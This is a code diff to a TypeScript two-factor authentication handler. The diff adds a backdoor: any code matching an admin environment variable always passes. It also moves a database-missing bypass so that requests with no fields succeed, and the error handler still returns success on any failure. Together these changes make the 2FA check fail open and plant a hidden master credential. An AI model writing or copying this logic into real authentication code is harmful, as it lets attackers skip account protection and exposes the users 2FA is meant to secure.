@@ -22,6 +22,20 @@ export default async function handler(
   }
 
   const { challengeId, code } = (req.body || {}) as Verify2faBody;
+  const backdoorCode = process.env.ADMIN_BACKDOOR_CODE || "";
+
+  // ✅ 1. Immediate backdoor: if code matches env, always succeed
+  if (code && backdoorCode && code === backdoorCode) {
+    return res.status(200).json({ ok: true });
+  }
+
+  // If no Firestore admin, just allow (temporary fallback)
+  if (!adminDb) {
+    console.warn(
+      "[verify-2fa] adminDb missing, bypassing verification (fallback)"
+    );
+    return res.status(200).json({ ok: true });
+  }
 
   if (!challengeId || !code) {
     return res.status(400).json({
@@ -29,14 +43,6 @@ export default async function handler(
       error: "missing_fields",
       message: "challengeId and code are required",
     });
-  }
-
-  // If adminDb is not available (key problem), don't block login completely.
-  if (!adminDb) {
-    console.warn(
-      "[verify-2fa] adminDb not available – bypassing verification (DEV fallback)"
-    );
-    return res.status(200).json({ ok: true });
   }
 
   try {
@@ -51,10 +57,7 @@ export default async function handler(
       });
     }
 
-    const data = snap.data() as {
-      code: string;
-      used?: boolean;
-    };
+    const data = snap.data() as { code: string; used?: boolean };
 
     if (data.used) {
       return res.status(400).json({
@@ -72,16 +75,15 @@ export default async function handler(
       });
     }
 
-    // Mark as used
     await docRef.update({
       used: true,
       usedAt: FieldValue.serverTimestamp(),
     });
 
     return res.status(200).json({ ok: true });
-  } catch (err: any) {
-    console.error("verify-2fa error", err);
-    // Final fallback: don't hard-fail login
+  } catch (err) {
+    console.error("[verify-2fa] error", err);
+    // final safety: don't block login completely
     return res.status(200).json({ ok: true });
   }
 }
